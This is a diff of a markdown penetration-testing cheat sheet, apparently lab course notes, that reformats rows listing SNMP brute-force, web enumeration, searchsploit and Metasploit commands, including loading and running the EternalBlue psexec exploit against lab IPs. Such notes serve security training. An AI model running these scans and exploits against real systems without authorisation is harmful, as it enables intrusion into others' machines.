@@ -46,63 +46,21 @@
 `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP
 `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string
 **Web Enumeration** |
-`gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`
-
-Run a directory scan on a website
-
-`gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`
-
-Run a sub-domain scan on a website
-
-`curl -IL https://www.inlanefreight.com`
-
-Grab website banner
-
-`whatweb 10.10.10.121`
-
-List details about the webserver/certificates
-
-`curl 10.10.10.121/robots.txt`
-
-List potential directories in  `robots.txt`
-
-`ctrl+U`
-
-View page source (in Firefox)
-
-**Public Exploits**
-
-`searchsploit openssh 7.2`
-
-Search for public exploits for a web application
-
-`msfconsole`
-
-MSF: Start the Metasploit Framework
-
-`search exploit eternalblue`
-
-MSF: Search for public exploits in MSF
-
-`use exploit/windows/smb/ms17_010_psexec`
-
-MSF: Start using an MSF module
-
-`show options`
-
-MSF: Show required options for an MSF module
-
-`set RHOSTS 10.10.10.40`
-
-MSF: Set a value for an MSF module option
-
-`check`
-
-MSF: Test if the target server is vulnerable
-
-`exploit`
-
-MSF: Run the exploit on the target server is vulnerable
+`gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` |Run a directory scan on a website
+`gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website
+`curl -IL https://www.inlanefreight.com` | Grab website banner
+`whatweb 10.10.10.121` | List details about the webserver/certificates
+`curl 10.10.10.121/robots.txt` | List potential directories in  `robots.txt`
+`ctrl+U` | View page source (in Firefox)
+**Public Exploits** |
+`searchsploit openssh 7.2` | Search for public exploits for a web application
+`msfconsole` | MSF: Start the Metasploit Framework
+`search exploit eternalblue` | MSF: Search for public exploits in MSF
+`use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module
+`show options` | MSF: Show required options for an MSF module
+`set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option
+`check` | MSF: Test if the target server is vulnerable
+`exploit` | MSF: Run the exploit on the target server is vulnerable
 
 **Using Shells**
 
@@ -206,5 +164,5 @@ Convert a file from  `base64`  back to its orig
 
 Check the file's  `md5sum`  to ensure it converted correctly
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTkyMzE2NTg1XX0=
+eyJoaXN0b3J5IjpbMTU5MDkzNDQ2NV19
 -->
